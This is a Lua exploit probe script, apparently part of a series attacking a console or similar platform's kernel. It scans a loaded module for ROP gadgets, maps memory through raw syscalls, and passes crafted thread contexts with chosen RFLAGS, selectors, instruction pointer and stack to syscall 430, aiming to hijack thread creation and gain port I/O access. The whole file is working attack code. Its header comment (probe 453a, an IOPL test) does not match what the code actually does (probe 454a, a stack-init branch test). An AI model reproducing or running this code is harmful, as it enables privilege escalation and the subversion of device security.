-- CRASH_CLASS: MODERATE
-- PROBE 453a: does the child inherit IOPL from our RFLAGS?
--
-- 397a proved RFLAGS reaches the CPU (IF=0 stopped the core scheduling),
-- so the field is copied rather than rebuilt. Bits 12-13 are IOPL: with
-- IOPL=3 and CPL=3, `in`/`out`/`cli`/`sti` are legal, i.e. userland gets
-- I/O port access.
--
-- 452a failed `in al, dx` with RFLAGS = 0x202 (IOPL 0) and CS = 0x40.
-- Same call with RFLAGS = 0x3202 (IOPL 3 + IF). Marker written => IOPL
-- was taken from our value and the game process now owns port I/O.

print("=== PROBE 454a: THE STACK-INIT BRANCH OF 430 ===")
print("")
local Z = uint64(0)
local function u64(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function call(sc, ...)
    local ok, rv = pcall(function(...) return sc(...) end, ...)
    if ok then return to_num(rv) end
    return -999
end
local function rd32(a) local ok, v = pcall(function() return memory.read_dword(a) end); if ok then return to_num(v) end return -1 end
local function rd64r(a) local ok, v = pcall(function() return memory.read_qword(a) end); if ok then return v end return nil end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function fmt(v) return string.format("0x%X", v) end

local info = memory.alloc(0x200)
pcall(function() memory.write_dword(info, 0x160) end)
local base, size = 0, 0
if call(make_syscall(593), Z, info) == 0 then
    local lo, hi = rd32(info + 0x108), rd32(info + 0x10C)
    if lo and hi and lo >= 0 and hi >= 0 then base = hi * 4294967296 + lo end
    size = rd32(info + 0x110)
end
if base == 0 or size <= 0 then print("  no base"); return end

local buf = nil
pcall(function() buf = memory.read_buffer(base, size) end)
if type(buf) ~= "string" then print("  read failed"); return end

-- first `EC C3` is the gadget we enter
local ING = 0
for i = 1, #buf - 1 do
    if string.byte(buf, i) == 0xEC and string.byte(buf, i + 1) == 0xC3 then
        ING = base + (i - 1); break
    end
end
-- write gadget `48 89 07 C3` and park `EB FE`
local GDP, PARK = 0, 0
for i = 1, #buf - 3 do
    if string.byte(buf, i) == 0x48 and string.byte(buf, i + 1) == 0x89
       and string.byte(buf, i + 2) == 0x07 and string.byte(buf, i + 3) == 0xC3 and GDP == 0 then
        GDP = base + (i - 1)
    end
    if string.byte(buf, i) == 0xEB and string.byte(buf, i + 1) == 0xFE and PARK == 0 then
        PARK = base + (i - 1)
    end
    if GDP ~= 0 and PARK ~= 0 then break end
end
print(string.format("  in-gadget=%s write=%s park=%s", fmt(ING), fmt(GDP), fmt(PARK)))
if ING == 0 or GDP == 0 or PARK == 0 then print("  gadget missing"); return end

local MAGIC_HI, MAGIC_LO = 0x1234, 0x567890AB
local marker = call(make_syscall(477), Z, uint64(0x1000), uint64(3), uint64(0x1002), u64(0xFFFFFFFF, 0xFFFFFFFF), Z)
local out = call(make_syscall(477), Z, uint64(0x1000), uint64(3), uint64(0x1002), u64(0xFFFFFFFF, 0xFFFFFFFF), Z)
local stack = call(make_syscall(477), Z, uint64(0x200000), uint64(3), uint64(0x1002), u64(0xFFFFFFFF, 0xFFFFFFFF), Z)
local buf = call(make_syscall(477), Z, uint64(0x1000), uint64(3), uint64(0x1002), u64(0xFFFFFFFF, 0xFFFFFFFF), Z)
if marker < 0 or out < 0 or stack < 0 or buf < 0 then print("  mmap failed"); return end

local function run(tag, flags, src, len)
    wd(marker, 0x5A5A); wq(marker, Z); wq(out, Z)
    local ctx = memory.alloc(0x500)
    local i = 0
    while i < 0x500 do wq(ctx + i, Z); i = i + 8 end
    wd(ctx + 0x0d0, flags)
    wq(ctx + 0x108, u64(0, 0x480))
    wq(ctx + 0x110, u64(0, 0x10000))
    wq(ctx + 0x0c0, u64(0, 0x43))
    wq(ctx + 0x100, u64(0, 0x3b))
    wq(ctx + 0x0f0, u64(0, 0x202))
    wq(ctx + 0x0e0, u64(0, GDP))
    wq(ctx + 0x048, u64(0, marker))
    wq(ctx + 0x078, u64(MAGIC_HI, MAGIC_LO))
    local sp = stack + 0x100000
    wq(ctx + 0x0f8, u64(0, sp))
    wq(sp, u64(0, GDP))
    wq(sp + 8, u64(0, PARK))
    if src ~= 0 then
        wq(ctx + 0x490, u64(0, src))
        wq(ctx + 0x498, u64(0, len))
    end
    local rv = call(make_syscall(430), ctx, out, Z, Z, Z, Z)
    local tid = rd64r(out)
    local x = 0
    while x < 300000 do x = x + 1 end
    local m = rd32(marker)
    print(string.format("  %-30s rv=%d tid=%s marker=0x%X", tag, rv, tostring(to_num(tid)), m or 0))
end

print("[A] boundary over the flags field")
run("flags=0 src=0", 0, 0, 0)
run("flags=1 src=0", 1, 0, 0)
run("flags=3 src=0", 3, 0, 0)
run("flags=4 src=0", 4, 0, 0)
run("flags=5 src=0", 5, 0, 0)
run("flags=7 src=0", 7, 0, 0)
print("[B] flags=4 with each stack length")
run("flags=4 len=0x0", 4, buf, 0x0)
run("flags=4 len=0x8", 4, buf, 0x8)
run("flags=4 len=0x80", 4, buf, 0x80)
run("flags=4 len=0x1000", 4, buf, 0x1000)
print("[C] flags=0 with each stack length (ignored if the branch needs 4)")
run("flags=0 len=0x1000", 0, buf, 0x1000)
run("flags=4 src=0 len=0x1000", 4, 0, 0x1000)

print("")
print("=== 454a DONE ===")
